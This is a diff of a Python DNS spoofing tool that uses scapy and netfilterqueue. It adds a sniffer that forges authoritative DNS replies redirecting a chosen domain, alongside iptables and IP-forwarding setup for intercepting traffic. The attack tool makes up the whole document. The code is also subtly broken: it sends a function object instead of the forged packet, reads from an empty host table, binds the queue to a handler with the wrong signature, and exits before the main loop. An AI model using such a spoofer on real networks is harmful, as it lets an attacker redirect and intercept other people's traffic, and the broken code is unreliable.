@@ -3,7 +3,8 @@ from operator import sub
 from sys import stdout
 from typing import Any
 import netfilterqueue
-import scapy.all as scapy
+from scapy.all import IP, UDP, DNS, DNSRR, DNSQR
+from scapy.all import scapy
 import subprocess
 import os
 from progress_tools import Spin
@@ -14,10 +15,9 @@ import network_tools
 
 dns_host = {
     # Web Domain in bytes : IP in string
-
 }
 
-catch_web = b''
+catch_web = b'generatools.com'
 
 
 def get_arg():
@@ -31,20 +31,21 @@ def get_arg():
     args = parser.parse_args()
     return args
 
-def cut_packets(packet):
-    packet.drop()
+# Spoofer 2
 
-def capture_packet(packet):
+def spoof_dns(packet):
+    if packet.haslayer(DNSQR):
+        spoof_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) /\
+                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /\
+                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
+                        an=DNSRR(packet[DNS].qd.qname, ttl=10, rdata=dns_host[catch_web]))
+        scapy.send(spoof_dns)
+        print(spoof_pkt.summary())
 
-    scapy_packet = scapy.IP(packet.get_payload())
-
-    if scapy_packet.haslayer(scapy.DNSRR):    
-        before = scapy_packet.summary()
-        after = spoof_packet(scapy_packet)
-        packet.set_payload( bytes(after) )
-        print (f'Before: {before} >> After: {after.summary()}')
-
-    packet.accept()
+def sniff_dns():
+    scapy.sniff( filter='udp port 53', iface='eth0', store=0, prn=spoof_dns )
+    
+# Spoofer 1
 
 def spoof_packet(scapy_packet):
     """Unreliable spoofer. It should not work on secure connection like HTTPS, HSTS..."""
@@ -66,6 +67,20 @@ def spoof_packet(scapy_packet):
     else:
         return scapy_packet
 
+def capture_packet(packet):
+
+    scapy_packet = scapy.IP(packet.get_payload())
+
+    if scapy_packet.haslayer(scapy.DNSRR):    
+        before = scapy_packet.summary()
+        after = spoof_packet(scapy_packet)
+        packet.set_payload( bytes(after) )
+        print (f'Before: {before} >> After: {after.summary()}')
+
+    packet.accept()
+
+# Iptables
+
 def setup_iptables(FORWARD=False, QUEUE_NUM=0):
     network_tools.enable_ip_forward(True)
     if FORWARD:
@@ -83,11 +98,14 @@ if __name__ == '__main__':
 
     args = get_arg()
     
+    sniff_dns()
+    exit()
+    
     try:
         spin_wait = Spin(f'Spoofing DNS: Waiting a domain in our record...')
         setup_iptables(args.ip_chain, args.QUEUE_NUM)
         queue = netfilterqueue.NetfilterQueue()
-        queue.bind(args.QUEUE_NUM, capture_packet)
+        queue.bind(args.QUEUE_NUM, sniff_dns)
         spin_wait.start_spin()
         queue.run()
     except KeyboardInterrupt:
